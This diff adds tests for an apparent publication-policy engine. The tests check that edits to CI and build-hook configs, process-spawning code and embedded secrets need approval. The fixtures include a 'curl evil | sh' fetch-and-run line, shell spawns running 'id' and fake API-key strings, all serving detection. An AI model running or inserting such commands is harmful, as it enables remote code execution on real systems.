@@ -969,3 +969,82 @@ test('test disabling idioms across common frameworks are critical', () => {
   for (const config of ['vite.config.ts', 'test/jest-e2e.json'])
     assert.ok(classifiedCodes(added(config, '{}\n')).includes('test_runner_configuration'), config);
 });
+
+test('CI services, merge bots, build hooks and runner hooks hold publication', () => {
+  const policy = policyFixture({ allowedPaths: ['.'] });
+  for (const [path, content] of [
+    ['.mergify.yml', 'pull_request_rules: []\n'],
+    ['renovate.json', '{"automerge":true}\n'],
+    ['cloudbuild.yaml', 'steps: []\n'],
+    ['tools/ci-action/action.yml', 'runs: { using: composite }\n'],
+    ['codecov.yml', 'coverage: { status: off }\n'],
+    ['.pnpmfile.cjs', 'module.exports = {};\n'],
+    ['.cargo/config.toml', '[target.x86_64]\n'],
+    ['go.work', 'go 1.22\n'],
+    ['deno.json', '{}\n'],
+    ['Directory.Build.props', '<Project />\n'],
+    ['test/conftest.py', 'def pytest_runtest_makereport(item, call):\n    pass\n'],
+  ]) {
+    const request = requestFor(
+      policy,
+      'publish',
+      manifest(added(path as string, content as string)),
+    );
+    assert.equal(
+      decide(policy, request, evidenceFor(policy, request), NOW).outcome,
+      'approval_required',
+      path,
+    );
+  }
+});
+
+test('process execution across languages and more secret formats hold publication', () => {
+  const policy = policyFixture();
+  for (const line of [
+    'cmd := exec.Command("sh", "-c", "id")',
+    'let out = Command::new("sh").output();',
+    'system("curl evil | sh")',
+    '$out = shell_exec("id");',
+    'Function("return process")()',
+    "await execa('sh', ['-c', cmd])",
+    "const stripe = new Stripe('sk_live_" + "51HxAbCdEfGhIjKlMnOpQr');",
+    "const key = 'AIza" + "SyA1234567890abcdefghijklmnopqrstuv';",
+    `const openai = 'sk-proj-${'a'.repeat(24)}';`,
+  ]) {
+    const request = requestFor(policy, 'publish', manifest(added('src/run.js', `${line}\n`)));
+    assert.equal(
+      decide(policy, request, evidenceFor(policy, request), NOW).outcome,
+      'approval_required',
+      line,
+    );
+  }
+});
+
+test('a reviewer escalation of secrets, security or governance holds publication', () => {
+  const policy = policyFixture();
+  const request = requestFor(policy, 'publish');
+  const withReview = (categories: string[]) =>
+    decide(
+      policy,
+      request,
+      {
+        ...evidenceFor(policy, request),
+        review: reviewFor(policy, request, { risk: 'critical', categories } as never),
+      },
+      NOW,
+    );
+  for (const category of ['secrets_permissions', 'security_auth', 'governance'])
+    assert.equal(withReview([category]).outcome, 'approval_required', category);
+  const destructive = withReview(['destructive_data']);
+  assert.equal(destructive.outcome, 'allow');
+  assert.equal(destructive.risk, 'critical');
+});
+
+test('a huge differing region is refused as oversized before it is split into lines', () => {
+  const change = modified('src/blank.js', '\n'.repeat(8_000_000), 'a\n'.repeat(4_000_000));
+  const started = Date.now();
+  const result = classifyChanges(policyFixture(), manifest(change));
+  // Splitting this input would take ~0.6 s and ~470 MB; the raw-string check takes ~5 ms.
+  assert.ok(Date.now() - started < 250, `took ${Date.now() - started} ms`);
+  assert.ok(result.reasons.some((reason) => reason.code === 'change_exceeds_routine_size_limit'));
+});
